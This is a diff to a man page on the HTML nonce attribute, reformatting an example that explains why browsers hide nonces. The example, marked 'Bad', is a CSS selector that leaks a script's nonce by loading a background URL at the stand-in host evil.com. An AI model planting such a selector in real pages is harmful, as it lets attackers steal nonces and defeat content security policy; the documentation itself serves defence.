@@ -31,7 +31,13 @@ Nonce hiding helps prevent attackers from exfiltrating nonce data via
 mechanisms that can grab data from content attributes like this CSS
 selector:
 .PP
-\f[CR]css example\-bad script[nonce\[ti]=\[dq]whatever\[dq]] {   background: url(\[dq]https://evil.com/nonce?whatever\[dq]); }\f[R]
+\f[B]Bad\f[R]
+.IP
+.EX
+script[nonce\[ti]=\[dq]whatever\[dq]] {
+  background: url(\[dq]https://evil.com/nonce?whatever\[dq]);
+}
+.EE
 .SH SEE ALSO
 .IP \[bu] 2
 \f[CR]nonce\f[R] global attribute
